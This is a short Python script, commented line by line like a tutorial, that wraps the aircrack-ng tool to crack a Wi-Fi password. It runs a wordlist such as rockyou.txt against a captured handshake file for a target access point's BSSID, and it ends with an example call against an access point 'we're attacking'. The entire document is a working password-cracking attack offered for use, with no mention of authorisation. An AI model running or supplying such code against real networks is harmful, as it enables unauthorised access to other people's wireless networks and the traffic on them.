# Import the subprocess module which allows us to run system commands from Python
import subprocess

# Define a function called 'crack_password' that attempts to crack a Wi-Fi password
# by running the aircrack-ng tool using a captured handshake file and a wordlist
def crack_password(cap_file, wordlist, bssid):
    # Print a status message to the terminal indicating which wordlist is being used
    print(f"[*] Cracking password using {wordlist}...")
    
    # Use subprocess.run() to execute the 'aircrack-ng' command-line tool
    # Parameters:
    # - '-w' specifies the wordlist to use for attempting to crack the password
    # - '-b' specifies the target BSSID (the MAC address of the Wi-Fi access point)
    # - 'cap_file' is the path to the captured handshake .cap file
    # capture_output=True captures the standard output and error of the command
    # text=True ensures the output is returned as a string (not bytes)
    result = subprocess.run(
        ['aircrack-ng', '-w', wordlist, '-b', bssid, cap_file],
        capture_output=True, text=True
    )
    
    # Return the captured standard output (stdout) from the aircrack-ng command
    return result.stdout

# === Example usage ===

# Call the crack_password function with:
# - 'capture-01.cap' as the captured handshake file
# - 'rockyou.txt' as the wordlist of possible passwords
# - 'AA:BB:CC:DD:EE:FF' as the BSSID of the Wi-Fi access point we're attacking
output = crack_password('capture-01.cap', 'rockyou.txt', 'AA:BB:CC:DD:EE:FF')

# Print the output from the aircrack-ng command to the terminal
print(output)